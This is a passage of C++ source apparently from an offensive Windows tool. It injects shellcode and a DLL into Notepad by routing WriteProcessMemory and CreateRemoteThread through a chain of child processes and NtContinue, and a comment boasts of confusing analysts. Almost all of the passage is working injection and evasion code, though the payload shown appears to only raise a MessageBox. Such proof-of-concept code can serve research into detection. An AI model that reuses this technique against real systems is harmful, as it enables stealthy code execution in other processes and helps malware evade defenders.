    wpmParams.rdx_val = remoteShellcodeMemAddress; // Target address in Notepad
    // R8 (lpBuffer) will point to shellcode data on the delegator's stack
    wpmParams.r9_val = sizeof(shellcode);          // nSize

    wpmParams.r8_is_ptr_offset_from_stack = TRUE;

    std::vector<DWORD64> wpmStackData;
    wpmStackData.push_back((DWORD64)NULL); // Placeholder for lpNumberOfBytesWritten (5th API arg)

    // Set r8_val to be the byte offset to where shellcode data will start in wpmStackData's layout
    wpmParams.r8_val = wpmStackData.size() * sizeof(DWORD64); // Should be 8 (pointing to 6th API arg at wpmStackData[1])

    // Serialize shellcode into QWORDs and append to wpmStackData
    const unsigned char* pSc = shellcode;
    size_t shellcodeActualLen = sizeof(shellcode);
    size_t numQwordsForShellcode = (shellcodeActualLen + sizeof(DWORD64) - 1) / sizeof(DWORD64);

    char tempQwordBuffer[sizeof(DWORD64)];
    for (size_t i = 0; i < numQwordsForShellcode; ++i) {
        ZeroMemory(tempQwordBuffer, sizeof(DWORD64));
        size_t remainingBytes = shellcodeActualLen - (i * sizeof(DWORD64));
        size_t bytesToCopyThisChunk = min(remainingBytes, sizeof(DWORD64));
        if (bytesToCopyThisChunk > 0) {
            memcpy(tempQwordBuffer, pSc + (i * sizeof(DWORD64)), bytesToCopyThisChunk);
        }
        wpmStackData.push_back(*(DWORD64*)tempQwordBuffer);
    }

    std::cout << "ShellcodeInjectionTest: Delegating WriteProcessMemory for shellcode..." << std::endl;
    DEBUG_PRINTF("InjectShellcodeToNotepadTest: WriteProcessMemory PARAMS: hProc=0x%llX, lpBaseAddr=0x%llX, (R8 from stack byte offset %llu), nSize=0x%llX (%llu)\n",
        wpmParams.rcx_val, wpmParams.rdx_val, wpmParams.r8_val, wpmParams.r9_val, wpmParams.r9_val);

    delegationChainSuccess = RecursiveDelegate(recursiveDelegationLevel, &wpmParams, &wpmStackData, pNtContinue, NULL, "default", &wpmResponse);

    if (!delegationChainSuccess || wpmResponse.apiReturnValue == 0) {
        std::cerr << "--- Notepad Shellcode Injection Test FAILED (WriteProcessMemory "
            << (!delegationChainSuccess ? "delegation chain" : "API call")
            << " failed) ---" << std::endl;
        std::cerr << "    Response: SuccessFlag=" << (wpmResponse.wasApiCallConsideredSuccess ? "TRUE" : "FALSE")
            << ", RAX=0x" << std::hex << wpmResponse.apiReturnValue << std::dec
            << ", ChildLE=" << wpmResponse.lastErrorValue << std::endl;
        return 1;
    }
    std::cout << "ShellcodeInjectionTest: WriteProcessMemory for shellcode successful." << std::endl;


    // 5. CreateRemoteThread in Notepad to execute the shellcode
    ApiCallResultResponse crtResponse = {};
    ApiCallParams crtParams = {};

    strncpy_s(crtParams.funcNameWithModule, "Kernel32!CreateRemoteThread", _TRUNCATE);
    crtParams.rcx_val = (DWORD64)hNotepad;
    crtParams.rdx_val = (DWORD64)NULL;              // lpThreadAttributes
    crtParams.r8_val = 0;                           // dwStackSize
    crtParams.r9_val = remoteShellcodeMemAddress;   // <<<< lpStartAddress is the shellcode address
    std::vector<DWORD64> crtStackArgs;
    crtStackArgs.push_back((DWORD64)NULL);          // lpParameter (NULL for this shellcode)
    crtStackArgs.push_back(0);                      // dwCreationFlags
    crtStackArgs.push_back((DWORD64)NULL);          // lpThreadId

    std::cout << "ShellcodeInjectionTest: Delegating CreateRemoteThread for shellcode..." << std::endl;
    DEBUG_PRINTF("InjectShellcodeToNotepadTest: CreateRemoteThread PARAMS: hProc=0x%llX, lpStartAddr=0x%llX, lpParam=0x%llX\n",
        crtParams.rcx_val, crtParams.r9_val, crtStackArgs[0]);

    delegationChainSuccess = RecursiveDelegate(recursiveDelegationLevel, &crtParams, &crtStackArgs, pNtContinue, NULL, "default", &crtResponse);

    if (!delegationChainSuccess || crtResponse.apiReturnValue == 0) {
        std::cerr << "--- Notepad Shellcode Injection Test FAILED (CreateRemoteThread "
            << (!delegationChainSuccess ? "delegation chain" : "API call")
            << " failed) ---" << std::endl;
        std::cerr << "    Response: SuccessFlag=" << (crtResponse.wasApiCallConsideredSuccess ? "TRUE" : "FALSE")
            << ", RAX=0x" << std::hex << crtResponse.apiReturnValue << std::dec
            << ", ChildLE=" << crtResponse.lastErrorValue << std::endl;
        CloseHandle(hNotepad);
        return 1;
    }

    HANDLE hRemoteThread = (HANDLE)crtResponse.apiReturnValue;
    std::cout << "ShellcodeInjectionTest: CreateRemoteThread for shellcode successful. Remote thread handle (at executor process): 0x" << std::hex << (DWORD64)hRemoteThread << std::dec << std::endl;

    std::cout << "--- Notepad Shellcode Injection Test Complete (check for MessageBox) ---" << std::endl;
    return 0;
}

int main(int argc, char* argv[]) {
	int recursiveDelegationLevel = 2; // We could also randomize this per function delegation call to give extra fun for analysts
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) { // Should always be loaded
        hNtdll = LoadLibraryA("ntdll.dll"); // Attempt to load if somehow not found
        if (!hNtdll) {
            std::cerr << "main: CRITICAL - Failed to load ntdll.dll. Error: " << GetLastError() << std::endl;
            return 1;
        }
    }

    NtContinue_t pNtContinue = (NtContinue_t)GetProcAddress(hNtdll, "NtContinue");
    FARPROC pExitThread = GetProcAddress(GetModuleHandleA("kernel32.dll"), "ExitThread");
    FARPROC pAsmStub = (FARPROC)CaptureRAX_And_CallHelper;

    // Create a shared MMF to share data with child processes for APIs requiring pointers to raw data
    // Imagine if we just passed response directly to the root parent like this instead of recursively with pipes lol so much headache saved...
    // In the end we place data on stack arguments in chunk and referense them as offsets to be fixed into absolute addresses because we're not PUSSIES and
	// also because we want to try and keep the relationship between the executor process and the root delegator process as a full arbitrary long chain with no shortcuts.
	//HANDLE hFileMapping = CreateFileMappingA(INVALID_HANDLE_VALUE, NULL, PAGE_READWRITE, 0, 4096, "RecursiveDelegationSharedMemSection");
	//if (hFileMapping == NULL) {
	//	std::cerr << "main: CRITICAL - Failed to create file mapping. Error: " << GetLastError() << std::endl;
	//	return 1;
	//}
	//void* pSharedSection = MapViewOfFile(hFileMapping, FILE_MAP_ALL_ACCESS, 0, 0, 0);
    //if (pSharedSection) {
    //    DEBUG_COUT("main: Shared memory section created successfully." << std::endl);
    //    g_pSharedSection = pSharedSection;
    //}
    //else {
    //    std::cerr << "main: Warning - Failed to map shared memory section.Error: " << GetLastError() << std::endl << "Remember delegated process has its own memory VA." << std::endl;
    //}

    if (!pNtContinue || !pExitThread) {
        std::cerr << "main: CRITICAL - Failed to resolve NtContinue or ExitThread. Error: "
            << (!pNtContinue ? "NtContinue " : "") << (!pExitThread ? "ExitThread " : "")
            << GetLastError() << std::endl;
        return 1;
    }
    DEBUG_PRINTF("main: NtContinue at %p, ExitThread at %p, pAsmStub at %p\n", (void*)pNtContinue, (void*)pExitThread, (void*)pAsmStub);



    if (argc > 1) { // Arguments suggest it's a child process
        DEBUG_COUT("main: Detected child mode." << std::endl);

		char* cmdLine = GetCommandLineA();
		DEBUG_COUT("main: Command line for child: " << cmdLine << std::endl);

        // Child process returns 0 on success, 1 on internal failure path
        return ProcessChildMode(argc, argv, pNtContinue) ? 0 : 1;
    }

    // ---- Parent Process Logic ----
    DEBUG_COUT("main: Detected parent mode." << std::endl);

    RunAllDelegationTests();
    std::cin.get(); // Wait for user input before exiting

    InjectDllToNotepadTest(recursiveDelegationLevel);
    std::cin.get(); // Wait for user input before exiting

    InjectShellcodeToNotepadTest(recursiveDelegationLevel);
	std::cin.get(); // Wait for user input before exiting

    return 0;
}